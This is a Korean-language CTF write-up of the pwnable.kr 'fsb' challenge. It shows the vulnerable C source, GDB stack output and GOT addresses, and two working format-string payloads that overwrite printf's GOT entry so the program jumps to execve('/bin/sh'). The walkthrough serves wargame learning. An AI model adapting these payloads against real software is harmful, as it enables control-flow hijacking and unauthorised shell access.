# Double Staged Format String Bug Attack

[TOC]

------

Double Format String bug Attack은 Format String Bug가 발생했을 때 Stack에 있는 값을 단 1 byte도 변경할 수 없는 상황에서도 사용할 수 있는 기술입니다. 특히 주소에 Null Byte가 많이 포함되는 64bit에서도 사용가능합니다 .(참고로 그햇 OO홍 님께서 만드신 기술이라고 하네요.)

## Pwnable.kr fsb 문제

<img src="https://user-images.githubusercontent.com/40850499/43204902-1833a3de-905d-11e8-99ed-7c648232d104.png" width="50%" align="center"></img>

먼저 확인해보니 NX가 걸려있고 partial  RELRO로 되어있고 까나리 없고 PIE 없다. 코드는 다음과 같다.

```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
	char* args[]={"/bin/sh", 0};
	int i;

	char*** pargv = &argv;
	char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
	*pargv=0;
	*penvp=0;

	for(i=0; i<4; i++){
		printf("Give me some format strings(%d)\n", i+1);
		read(0, buf, 100);
		printf(buf);
	}

	printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
	return 0;
}

int main(int argc, char* argv[], char** envp){

	int fd = open("/dev/urandom", O_RDONLY);
	if( fd==-1 || read(fd, &key, 8) != 8 ){
		printf("Error, tell admin\n");
		return 0;
	}
	close(fd);

	alloca(0x12345 & key);

	fsb(argv, envp); // exploit this format string bug!
	return 0;
}
```

main() 에서 /dev/urandom을 이용해 8바이트 읽고 이것을 key 값으로 사용한다. 이후 alloca를 이용해 0x12345 & key 만큼 메모리 할당하는데 fsb를 이용해 직접적으로 key 값에 접근하지 못하게 하기위한 것 같다. 결론적으로 다음 코드에서 FSB가 터진다.

``` c
	for(i=0; i<4; i++){
		printf("Give me some format strings(%d)\n", i+1);
		read(0, buf, 100);
		printf(buf);
	}
```

printf()에서 ("%s" , buf) 형식으로 사용하지 않고 버퍼를 그대로 인자로 사용해 발생하는 취약점이다. 하지만, 보통 fsb같은 경웨는 buf가 전역변수가 아니다. (예로 ftz 11, 20) 하지만, 이 코드를 보면 buf와 buf2가 전역변수로 설정되어있고 스택을 변경할 수가 없다. 따라서 Double Staged Format String Bug Attack 을 이용한다. 

## GDB 를 이용한 스택 확인

printf(buf);에 브레이크포인트를 걸고 실행해서 AAAA를 넣어보면 

```assembly
(gdb) x/64wx $esp
0xfff257c0:	0x0804a100	0x0804a100	0x00000064	0x00000000
0xfff257d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff257e0:	0x00000000	0x08048870	0x00000000	0x00000001
0xfff257f0:	0xfff27a58	0xfff27fe9	0xfff25810	0xfff25814
0xfff25800:	0x00000000	0x00000000	0xfff27958	0x08048791
0xfff25810:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25820:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25830:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25840:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25850:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25860:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25870:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25880:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25890:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff258a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff258b0:	0x00000000	0x00000000	0x00000000	0x00000000
```

스택에 보이지 않는다(당연하다 data영역으로 들어간다.) 스택을 조작 할 수 없을 것 같다. 하지만 희망의 한줄기의 빛 같은 0xfff25810이 보인다. 다다다다다다다음 4byte를 부른다. (다*7음이다.) 정리해보자.

i) 스택의 특정 위치를 가리키는 포인터가 저장되어 있고

ii) 위 위치에 접근 가능하기 때문에

Double staged fsb를 사용할 수 있다. 그럼 어디 메모리 주소를 쓰고 그 주소를 뭘로 덮을까

## Scenario

시나리오를 생각해보자

printf의 GOT를 fsb()내의 execve("/bin/sh")로 뛰면 된다. 

```bash
fsb@ubuntu:~$ objdump -R ./fsb

./fsb:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   read@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   sleep@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   __gmon_start__
0804a014 R_386_JUMP_SLOT   open@GLIBC_2.0
0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   execve@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   strtoull@GLIBC_2.0
0804a024 R_386_JUMP_SLOT   close@GLIBC_2.0

....

Breakpoint 1, 0x08048610 in fsb ()
(gdb) x/wx 0x804a004
0x804a004 <printf@got.plt>:	0xf7608f40
```

```bash
   0x080486ab <+375>:	mov    eax,DWORD PTR [ebp-0x24]
   0x080486ae <+378>:	mov    DWORD PTR [esp+0x8],0x0
   0x080486b6 <+386>:	lea    edx,[ebp-0x24]
   0x080486b9 <+389>:	mov    DWORD PTR [esp+0x4],edx
   0x080486bd <+393>:	mov    DWORD PTR [esp],eax
   0x080486c0 <+396>:	call   0x8048450 <execve@plt>
```

## Exploit

익스플로잇을 진행해보면

```bash
Give me some format strings(1)
%134520836c%14$n
...
Give me some format strings(2)
%134514347c%20$n
...
$
```

와 같이 할 수 있다.



